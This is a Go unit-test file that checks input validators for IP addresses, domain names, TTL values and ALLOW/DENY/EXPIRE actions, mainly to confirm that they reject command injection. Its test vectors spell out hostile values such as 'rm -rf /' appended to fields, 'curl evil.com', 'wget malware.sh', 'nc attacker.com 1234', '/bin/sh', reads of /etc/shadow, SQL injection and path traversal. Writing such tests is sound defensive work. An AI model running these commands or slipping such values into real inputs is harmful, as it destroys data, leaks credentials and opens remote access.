package main

import (
	"fmt"
	"strings"
	"testing"
)

func TestValidateScriptInput(t *testing.T) {
	tests := []struct {
		name      string
		input     string
		inputType string
		expectErr bool
	}{
		// Valid IP addresses
		{name: "valid IPv4", input: "192.168.1.1", inputType: "ip", expectErr: false},
		{name: "valid IPv6", input: "2001:db8::1", inputType: "ip", expectErr: false},
		{name: "localhost IPv4", input: "127.0.0.1", inputType: "ip", expectErr: false},
		{name: "localhost IPv6", input: "::1", inputType: "ip", expectErr: false},
		
		// Invalid IP addresses
		{name: "invalid IPv4", input: "256.256.256.256", inputType: "ip", expectErr: true},
		{name: "malformed IP", input: "192.168.1", inputType: "ip", expectErr: true},
		{name: "injection in IP", input: "192.168.1.1; rm -rf /", inputType: "ip", expectErr: true},
		
		// Valid domains
		{name: "valid domain", input: "example.com", inputType: "domain", expectErr: false},
		{name: "subdomain", input: "sub.example.com", inputType: "domain", expectErr: false},
		{name: "domain with trailing dot", input: "example.com.", inputType: "domain", expectErr: false},
		{name: "single letter domain", input: "a.com", inputType: "domain", expectErr: false},
		{name: "domain with hyphens", input: "test-domain.example-site.com", inputType: "domain", expectErr: false},
		
		// Invalid domains
		{name: "domain too long", input: strings.Repeat("a", 254), inputType: "domain", expectErr: true},
		{name: "empty domain", input: "", inputType: "domain", expectErr: true},
		{name: "domain with spaces", input: "exam ple.com", inputType: "domain", expectErr: true},
		{name: "domain with injection", input: "example.com; rm -rf /", inputType: "domain", expectErr: true},
		{name: "domain starting with hyphen", input: "-example.com", inputType: "domain", expectErr: true},
		{name: "domain ending with hyphen", input: "example-.com", inputType: "domain", expectErr: true},
		{name: "domain with consecutive dots", input: "example..com", inputType: "domain", expectErr: true},
		
		// Valid TTL
		{name: "valid TTL", input: "300", inputType: "ttl", expectErr: false},
		{name: "zero TTL", input: "0", inputType: "ttl", expectErr: false},
		{name: "large TTL", input: "86400", inputType: "ttl", expectErr: false},
		
		// Invalid TTL
		{name: "negative TTL", input: "-1", inputType: "ttl", expectErr: true},
		{name: "non-numeric TTL", input: "abc", inputType: "ttl", expectErr: true},
		{name: "TTL with injection", input: "300; rm -rf /", inputType: "ttl", expectErr: true},
		{name: "TTL with spaces", input: "300 ", inputType: "ttl", expectErr: true},
		
		// Valid actions
		{name: "ALLOW action", input: "ALLOW", inputType: "action", expectErr: false},
		{name: "DENY action", input: "DENY", inputType: "action", expectErr: false},
		{name: "EXPIRE action", input: "EXPIRE", inputType: "action", expectErr: false},
		
		// Invalid actions
		{name: "invalid action", input: "EXECUTE", inputType: "action", expectErr: true},
		{name: "lowercase action", input: "allow", inputType: "action", expectErr: true},
		{name: "action with injection", input: "ALLOW; rm -rf /", inputType: "action", expectErr: true},
		{name: "empty action", input: "", inputType: "action", expectErr: true},
		
		// General tests
		{name: "too long input", input: strings.Repeat("a", 256), inputType: "domain", expectErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateScriptInput(tt.input, tt.inputType)
			if tt.expectErr && err == nil {
				t.Errorf("validateScriptInput(%q, %q) expected error but got none", tt.input, tt.inputType)
			}
			if !tt.expectErr && err != nil {
				t.Errorf("validateScriptInput(%q, %q) unexpected error: %v", tt.input, tt.inputType, err)
			}
		})
	}
}

func TestValidationSecurity(t *testing.T) {
	// Test various injection vectors to ensure they're properly rejected
	injectionVectors := []struct {
		input     string
		inputType string
	}{
		{"; rm -rf /", "domain"},
		{"&& curl evil.com", "domain"},
		{"|| wget malware.sh", "domain"},
		{"`whoami`", "domain"},
		{"$(id)", "domain"},
		{"|nc attacker.com 1234", "domain"},
		{"> /etc/passwd", "domain"},
		{"< /etc/shadow", "domain"},
		{"'; DROP TABLE users; --", "domain"},
		{"\"; system('rm -rf /'); \"", "domain"},
		{"../../../etc/passwd", "domain"},
		{"\n\nmalicious command", "domain"},
		{"\r\ninjected command", "domain"},
		{"192.168.1.1; rm -rf /", "ip"},
		{"2001:db8::1; echo pwned", "ip"},
		{"300; curl evil.com", "ttl"},
		{"ALLOW; /bin/sh", "action"},
	}

	for _, vector := range injectionVectors {
		t.Run(fmt.Sprintf("Injection vector %s (%s)", vector.input, vector.inputType), func(t *testing.T) {
			err := validateScriptInput(vector.input, vector.inputType)
			if err == nil {
				t.Errorf("validateScriptInput(%q, %q) should have rejected injection vector", vector.input, vector.inputType)
			}
		})
	}
}

func TestDomainValidation(t *testing.T) {
	tests := []struct {
		name      string
		domain    string
		expectErr bool
	}{
		{name: "valid simple domain", domain: "example.com", expectErr: false},
		{name: "valid subdomain", domain: "www.example.com", expectErr: false},
		{name: "valid deep subdomain", domain: "api.v1.service.example.com", expectErr: false},
		{name: "valid with numbers", domain: "test123.example.com", expectErr: false},
		{name: "valid with hyphens", domain: "test-site.example-domain.com", expectErr: false},
		{name: "valid single char", domain: "a.com", expectErr: false},
		{name: "valid with trailing dot", domain: "example.com.", expectErr: false},
		
		{name: "invalid empty", domain: "", expectErr: true},
		{name: "invalid too long", domain: strings.Repeat("a", 254), expectErr: true},
		{name: "invalid with spaces", domain: "exam ple.com", expectErr: true},
		{name: "invalid starting with hyphen", domain: "-example.com", expectErr: true},
		{name: "invalid ending with hyphen", domain: "example-.com", expectErr: true},
		{name: "invalid consecutive dots", domain: "example..com", expectErr: true},
		{name: "invalid with underscore at start", domain: "_example.com", expectErr: true},
		{name: "invalid with special chars", domain: "example@.com", expectErr: true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validateDomainName(tt.domain)
			if tt.expectErr && err == nil {
				t.Errorf("validateDomainName(%q) expected error but got none", tt.domain)
			}
			if !tt.expectErr && err != nil {
				t.Errorf("validateDomainName(%q) unexpected error: %v", tt.domain, err)
			}
		})
	}
}